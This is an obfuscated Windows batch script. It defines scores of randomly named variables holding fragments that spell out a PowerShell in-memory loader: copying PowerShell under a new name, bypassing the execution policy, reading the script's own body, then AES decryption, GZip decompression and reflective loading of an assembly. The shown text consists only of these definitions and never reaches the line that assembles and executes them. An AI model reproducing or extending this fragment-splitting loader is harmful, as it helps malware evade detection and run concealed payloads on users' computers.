@echo off
set "vQgAERBsIR=in"
set "XyZyBNdCaV=do"
set "yXimmBSCxo=he"
set "xuMKjSxQuQ=Po"
set "wSgyldcFDD=we"
set "VGvQXjbTfR=:\"
set "VjkQuDLopI=he"
set "ngzPtkdnqt=s\"
set "jLyUOMRGsx=nd"
set "jBNOKUMZte= C"
set "ZZcBJaKEpl=we"
set "FBolCbQQpi=xe"
set "RrqqhYetjh=.e"
set "nEvdsKbCqo=co"
set "oXWmRoaFGX=py"
set "BbdeqTFRWQ=\W"
set "SbCeJsKOln=ll"
set "OYxyLdmJBE=em"
set "QZRuUkhAck=Sy"
set "ruAITCPmgP=st"
set "raWXoNVsiS=ws"
set "EYyAyreNhZ=Wi"
set "sNqVnBVGCZ=0\"
set "nlHeKgGSfn=y "
set "XcjltICfpI=ow"
set "LqOEdtDLlN=\v"
set "SDsdSXaTrB=rs"
set "BwwbfFuFNa=po"
set "JEqYHYkPqj=32"
set "pnhkyzTxMk=ll"
set "PdQbyvUimR=rS"
set "hhgatQaouz= /"
set "YpDDUmHqeI=1."
set "jytwUuYVnn=cd"
set "elMBIqkAzf= %~dp0"
set "eGIZnzduxm=comp"
set "imkCgBsYBc=rofi"
set "MeRQMJUVlN=.Dis"
set "MKJopovgDH=gMod"
set "PuwCltIhvi=);$N"
set "oHcgpVXJYb=-joi"
set "GStqFLsmFn=l5E7"
set "PcNimbFcmX=ay()"
set "HjtMfZUjLA=ert]"
set "HPwhnTvPXL=ring"
set "MIRamPHApq=ress"
set "nhLHsgXwYI=saBm"
set "pJUHpKNlsw=::De"
set "IqfntakWJl=pose"
set "jgnhZulmrs= '')"
set "WKMdaMTJDx=Syst"
set "iivHHNkrBD=F.Su"
set "AeQoIZptiC=);$G"
set "rueDSYlcfT=();$"
set "dvDEWjgsfx=)) {"
set "ZiLthfGkqe=rtS4"
set "KuFARuczeY=-1.."
set "WltbwrxFYy= [Sy"
set "sCUFkEngNJ=PKCS"
set "HmmjcrNLHT=oArr"
set "muzqbQMUrs=ose("
set "dqJhNyGLkz=nirt"
set "QkdXDhlxcm=vert"
set "iSdXFLkPMO=daeR"
set "zcBtQqHsJC=LxF "
set "qeOiJQNktS=O.Me"
set "zowHvmJmDf=;$VM"
set "qQRpjdxpia=Z.Pa"
set "sIMPcQkNvO=m(, "
set "hbsuDrJPzK=am;$"
set "EmEXgdZpDV=ck($"
set "iQiAkjtgyl=gnir"
set "FjQHFGRUuz=.Cop"
set "QOBrpueUKn= if "
set "ycEWzTyVMh=rity"
set "szLrsvgItY=bypa"
set "PkJegwHIjj=ddin"
set "oLiYJLhlZi=y]::"
set "EYDdYEPyYh=nage"
set "AmjepOpTlc=File"
set "xxYwyKzZGI=;$ob"
set "vWcndxLuKr=$LWd"
set "bwvKiGzOil=mory"
set "EpCAusRioa=, $L"
set "SAfnyrvUyq=y.Cr"
set "bogvnIDoTr=ode]"
set "vDvrJRqygy=zuZI"
set "YmXZpsDwcF=E, 0"
set "yiCMPBLOET=oint"
set "SzkJhbyljq=[Sys"
set "WpPaBAovPK=null"
set "BFbBbyjNmW=BC;$"
set "ayQaHmiqGY=; };"
set "bgsrtgLHOp=esaB"
set "WuSXaxlpdU=ect "
set "hurGUkFbTR=o) {"
set "jEdrrrxcjg=Bmor"
set "CUDJBRGWgy=yste"
set "WDCtKHPunt=, (,"
set "LSYmRNtsSw=m.IO"
set "yVVcOfpLgj=ewLi"
set "yrpGOJjNkI=tryP"
set "GlFSIeMIeg=.Mem"
set "IXPHWaCAMO=Disp"
set "pKhUlDWVml=stem"
set "PvSZPrlicq= '')"
set "CJOCPjwbYe=]::N"
set "zkNwfXlfcx=pCCZ"
set "BxPISdChMU=7;$K"
set "JdSKOlkwNo=Comp"
set "hgucEAUEAu=-nop"
set "LKsVhdZnjT=)($x"
set "uvRbfyPCMZ=form"
set "NftHATjAux=ss -"
set "GqrayFNekc=sion"
set "OJfdlVepVA=Conv"
set "zNWgHEJamr=raph"
set "tsYCTYSwtY=nOl."
set "IXHnbxNfbH=rt]:"
set "JhFTJNgnkv=YxVw"
set "oXMxOugQyB=.Sec"
set "RdwKjVbCfN=('%~f0'"
set "KkQktxVaMY=V = "
set "xJvaXdvUTI=TllA"
set "sqOxSWsreJ=join"
set "YArRRufucQ=16] "
set "zfBXGHRoBM=Ol, "
set "MDfMNarEuS=rans"
set "hDmdoMLzDb== $K"
set "ljeKpubjfC=aZo "
set "engECAbovF=oryS"
set "PbmTvIoDQL=LxF."
set "KoAhdfOMvQ=ptog"
set "ZeikrmKZyb===')"
set "bPFeTiFgti=yste"
set "YuARuFuUXF=e = "
set "aJUIutUgOv=$DgX"
set "iUokydsylV=WdiE"
set "McHGzoXCPf=[Sys"
set "rqbaoSWBBm=pCCZ"
set "KITmxoNMBB=ing("
set "IVqmitCboS=.Cry"
set "GZvuTsOEYF=s75K"
set "pYjgXEHoam=LWdi"
set "uzZXqXIdCi=RmAx"
set "RZemObuFTZ=.Cre"
set "mAzPssNTui=[]] "
set "pYEhjVJuzF=ne);"
set "RQbibtYaqd=urit"
set "lFiuqnMyFD= New"
set "ZvWKLdVCHM=flec"
set "IQRPCbnNoI=em.C"
set "HgFUZzxZDf=tion"
set "cmVcWZPtqo=yTo("
set "oZTzGgvYmJ=iE ="
set "xtAdTmaqhk=);$k"
set "edBrszUhMK=('%*'"
set "bwDhrlBcRS=ecry"
set "snpajONjAa=ose("
set "WnjxlhBOLl=wWyB"
set "iTVlLaeahR=New-"
set "asfSOcTNjX=.IO."
set "sfFErRMKMi=();$"
set "hOjNSlOSOv= = $"
set "PYfDQLaElJ=ct S"
set "XWcXVpUeoW=[Env"
set "VRefAEUkOo=PTtG"
set "eoKGoqpdda=grap"
set "CoWUHgroGh=le  "
set "HnWLlWQFbd=tem."
set "ZwByocfFXI=pres"
set "rNbfBCtroq=);$K"
set "bsRxkyqrCT=d;$K"
set "dJybHrnAzC=orF'"
set "iiCCpBTurF=ispo"
set "gXUgWeEhmk=fSX."
set "UtszKnXliH=106u"
set "jGTZeKmCkH=m.IO"
set "glEorNVhjX=;$VM"
set "iBxlHleihg=t Sy"
set "lgASdWaSLd=trea"
set "QnXvQmHHfS= = $"
set "FGFBaqZpeZ=eam("
set "zrObjywqSL=E = "
set "LBiRynHbQb=GBOP"
set "hAjctkQeeL=.Key"
set "JOkXMVpeRm=tem."
set "uBbKUUOPmQ=N = "
set "PyeNdhhvfQ=)))"
set "nhnwdbQYZl=g = "
set "cIjkIwVzty=Mode"
set "kJmVwxyIrR=$NwW"
set "muCwOLctuL== [S"
set "GCgtwZZhTM=ddin"
set "ajHHfaDuOR=($al"
set "aUFlhkqBxR=tem."
set "ILMfgjnQLr=yste"
set "RTJVoqvVIR=PxEW"
set "zoOpoNZWrN=-ep "
set "eOWDZdsKFX=ress"
set "nhuJiygkUs=ach "
set "amrUxDfBmu='txe"
set "OsOzZIGeiM=oL'["
set "sjLyxTwBjS=('Tg"
set "cZyczMfvKb=pStr"
set "bwCoaTVZap=]::C"
set "BvHOJcDFBl=and "
set "gVApYCjfLY=$KpC"
set "WipIIzvxSN=tS46"
set "GvxGLxCqCW=pCCZ"
set "JvDHcjFfUm=eMVs"
set "gtzkJBEIuF=raph"
set "bkzSzmHWJF=L4Yi"
set "exYJKAYazG=-Obj"
set "HkmcbOCHWG=th('"
set "HkiOGIHHgS=bstr"
set "xHlyDhunCW=();$"
set "dFkLWiDVYL=in $"
set "bgJSXvvbfj= = N"
set "ADaKvcyRhd=..-1"
set "OTGIezRyYR=e]::"
set "IjaxmCzCEN=ionM"
set "SHYxpVaSxx=::('"
set "GmPTDWXVkh=PN.D"
set "QrTeQuDrcY=$LWd"
set "djQWmspFIN=.Len"
set "nnUeksCdsX=Comp"
set "WpmeQUxPLf=ke($"
set "MwhaDBVUGG=n ''"
set "fdcmyOtZWr=n ''"
set "nzpWRBwefw=rity"
set "yCVWhnvSNJ=join"
set "KcMYHTqjWJ=em.I"
set "IccDQpHSuV=);$K"
set "GrafUtGzIJ=akFB"
set "uMHGnTfFHx=l = "
set "UxxdIDRZnc=]::("
set "JHZTtwEEZW=bjec"
